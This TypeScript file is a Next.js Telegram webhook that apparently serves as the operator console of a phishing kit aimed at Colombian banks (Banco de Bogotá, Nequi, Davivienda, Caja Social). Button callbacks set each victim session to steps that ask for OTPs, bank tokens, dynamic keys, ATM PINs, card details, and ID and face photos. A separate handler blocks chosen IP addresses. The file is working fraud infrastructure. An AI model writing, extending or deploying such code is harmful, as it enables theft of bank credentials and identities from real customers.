/* eslint-disable @typescript-eslint/no-explicit-any */
import { NextRequest, NextResponse } from "next/server";

export const dynamic = "force-dynamic";

import { setSessionStatus, addIPToBlacklist, blockSessionsByIP } from "@/lib/supabaseSession";
import { getTelegramConfig } from "@/lib/telegramConfig";

export async function POST(req: NextRequest) {
  try {
    const update = await req.json();
    const { botToken } = getTelegramConfig();

    // 1. Si no es un callback de botón, cerramos con 200 para que Telegram no reintente
    if (!update.callback_query) {
      return NextResponse.json({ ok: true }, { status: 200 });
    }

    const cq = update.callback_query;
    const message = cq.message;
    const data = cq.data; // Formato "status:sessionId"
    const chatId = message.chat.id;
    const callbackQueryId = cq.id;

    // Manejar lógica de bloqueo de IP
    if (data && data.startsWith("block_")) {
      const ip = data.replace("block_", "");
      try {
        await addIPToBlacklist(ip);
        await blockSessionsByIP(ip);

        answerCallback(callbackQueryId, `🚫 IP ${ip} bloqueada exitosamente.`).catch(err => console.error(err));

        const originalText = message.text || message.caption || "";
        const adminName = cq.from?.first_name || cq.from?.username || "Admin";
        const newText = `${originalText}\n\n✅ [${adminName}] bloqueó la IP: ${ip}`;

        if (message.text) {
          safeEditMessageText(botToken || "", chatId, message.message_id, newText, true)
            .catch(err => console.error("Error editing IP block message:", err));
        }
      } catch (err) {
        console.error("Error bloqueando IP:", err);
        await answerCallback(callbackQueryId, "❌ Error al bloquear IP");
      }
      return NextResponse.json({ ok: true }, { status: 200 });
    }

    // Split seguro para evitar errores de undefined
    const parts = data ? data.split(":") : [];
    const status = parts[0];
    const sessionIdRaw = parts[1];

    if (!sessionIdRaw || sessionIdRaw === "undefined" || sessionIdRaw === "null") {
      console.error("❌ sessionId inválido recibido en Webhook");
      await answerCallback(callbackQueryId, "❌ Sesión no válida");
      return NextResponse.json({ ok: true }, { status: 200 });
    }

    const sessionId = String(sessionIdRaw);
    const adminName = cq.from?.first_name || cq.from?.username || "Admin";
    const originalText = message.text || message.caption || "";
    const isNequi = originalText.toLowerCase().includes("nequi");

    // 🚀 Responder INMEDIATAMENTE a Telegram para quitar el ícono de carga del botón (en background)
    answerCallback(callbackQueryId, "Procesando...").catch(err => console.error("Error answering callback:", err));

    // LÓGICA DE SUB-MENÚS (No actualiza sessionStore ni borra botones, solo cambia el teclado)
    if (status === "menu_efacial") {
      const { getErrorFacialKeyboard } = await import("@/lib/telegramKeyboards");
      fetch(`https://api.telegram.org/bot${botToken}/editMessageReplyMarkup`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          message_id: message.message_id,
          reply_markup: getErrorFacialKeyboard(sessionId)
        })
      }).catch(err => console.error("Error menu_efacial:", err));
      return NextResponse.json({ ok: true }, { status: 200 });
    }

    if (status === "menu_back") {
      const { getFullKeyboard, getFullKeyboardNequi, getFullKeyboardEmpresas, getFullKeyboardCajaSocial } = await import("@/lib/telegramKeyboards");
      const isEmpresas = originalText.toLowerCase().includes("negocios") || originalText.toLowerCase().includes("svn") || originalText.toLowerCase().includes("empresa");
      const isCajaSocial = originalText.toLowerCase().includes("cajasocial") || originalText.toLowerCase().includes("caja social");
      let reply_markup;
      if (isCajaSocial) {
        reply_markup = getFullKeyboardCajaSocial(sessionId);
      } else if (isEmpresas) {
        reply_markup = getFullKeyboardEmpresas(sessionId);
      } else if (isNequi) {
        reply_markup = getFullKeyboardNequi(sessionId);
      } else {
        reply_markup = getFullKeyboard(sessionId);
      }
      fetch(`https://api.telegram.org/bot${botToken}/editMessageReplyMarkup`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          message_id: message.message_id,
          reply_markup
        })
      }).catch(err => console.error("Error menu_back:", err));
      return NextResponse.json({ ok: true }, { status: 200 });
    }

    // 2. ACTUALIZAR ESTADO (Persistido en Supabase y Memoria)
    const globalAny = global as any;
    if (!globalAny.__sessionStatusMap) globalAny.__sessionStatusMap = {};
    globalAny.__sessionStatusMap[sessionId] = status;

    await setSessionStatus(sessionId, status);
    console.log(`🚀 [ESTADO ACTUALIZADO] ID: ${sessionId} -> Status: ${status}`);

    // 3. GENERAR RESPUESTA Y NOTIFICAR EN EL MISMO MENSAJE (en background)
    const newText = `${originalText}\n\n✅ [${adminName}] solicitó: ${getResponseText(status, sessionId)}`;
    safeEditMessageText(botToken || "", chatId, message.message_id, newText, !!message.text)
      .catch(err => console.error("Error editing status message:", err));
    
    return NextResponse.json({ ok: true }, { status: 200 });

  } catch (error: any) {
    console.error("❌ Error Webhook Railway:", error.message);
    // Siempre enviamos 200 a Telegram aunque falle el proceso interno
    return NextResponse.json({ ok: true }, { status: 200 });
  }
}

// --- HELPERS REFORZADOS ---

function getResponseText(status: string, sessionId: string) {
  const map: Record<string, string> = {
    otp: `🔑 Solicitando OTP...`,
    eotp: `❌ Error en OTP, pidiendo de nuevo...`,
    otp8: `🔑 Solicitando OTP (8 dígitos)...`,
    eotp8: `❌ Error en OTP (8 dígitos), pidiendo de nuevo...`,
    error_asesor: `⛔ Notificando error de transacción (Asesor)...`,
    autorizar_app: `📲 Solicitando autorización en App Banco de Bogotá...`,
    token: `🔑 Solicitando Token...`,
    etoken: `❌ Error en Token, pidiendo de nuevo...`,
    dinamica: `🔐 Solicitando Clave Dinámica...`,
    edinamica: `❌ Error en Dinámica, pidiendo de nuevo...`,
    cajero: `🔢 Solicitando Clave Cajero...`,
    ecajero: `❌ Error en Clave Cajero, pidiendo de nuevo...`,
    edavivienda: `⛔ Mostrando Error Sistema (Excúsenos)...`,
    tc: `💳 Solicitando Tarjeta (TC/TD)...`,
    etc: `❗ Error en Tarjeta, pidiendo reintento...`,
    actdatos: `👤 Solicitando Actualización de Datos...`,
    facial: `🤳 Solicitando Verificación Facial...`,
    elogo: `⚠️ Error de acceso (Logo)...`,
    fin: `✅ Sesión finalizada con éxito.`,
    xsistema: `❌ Falla en el sistema (XSistema)...`,
    xbloqueo: `❌ Bloqueo por seguridad (Código 923)...`,
    efacial_frente: `❌ Error en Foto Frontal ID, pidiendo de nuevo...`,
    efacial_dorso: `❌ Error en Foto Trasera ID, pidiendo de nuevo...`,
    efacial_cara: `❌ Error en Verificación Facial, pidiendo de nuevo...`,
    error: `❌ Error en los datos, pidiendo de nuevo...`,
    qr: `📱 Solicitando Pago QR Bre...`,
    solicitud_qr: `📱 Solicitando Pago QR Bre...`,
    eqr: `❌ QR error (Error vuelve a intentarlo)...`,
    error_qr: `❌ QR error (Error vuelve a intentarlo)...`,
  };

  const msg = map[status] || `⚠️ Acción desconocida: ${status}`;
  return `${msg}\n🆔 ID: ${sessionId}`;
}

async function telegramSendMessage(chat_id: number, text: string) {
  const { botToken } = getTelegramConfig();
  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id, text, parse_mode: 'HTML' })
  });
}

async function answerCallback(callback_query_id: string, text: string) {
  const { botToken } = getTelegramConfig();
  await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ callback_query_id, text })
  });
}

async function safeEditMessageText(botToken: string, chatId: any, messageId: any, text: string, isText: boolean) {
  const payload: any = {
    chat_id: chatId,
    message_id: messageId,
    reply_markup: { inline_keyboard: [] }
  };
  
  const endpoint = isText ? "editMessageText" : "editMessageCaption";
  const textKey = isText ? "text" : "caption";

  // Try 1: HTML
  try {
    const escapedHTML = text
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;");
    const res = await fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        ...payload,
        [textKey]: escapedHTML,
        parse_mode: "HTML"
      })
    });
    const data = await res.json();
    if (data.ok) return;
  } catch (e) {}

  // Try 2: Markdown
  try {
    const escapedMarkdown = text.replace(/([_*\[\]()~`>#+\-=|{}.!])/g, "\\$1");
    const res = await fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        ...payload,
        [textKey]: escapedMarkdown,
        parse_mode: "Markdown"
      })
    });
    const data = await res.json();
    if (data.ok) return;
  } catch (e) {}

  // Try 3: Plain text
  try {
    await fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        ...payload,
        [textKey]: text
      })
    });
  } catch (e) {}
}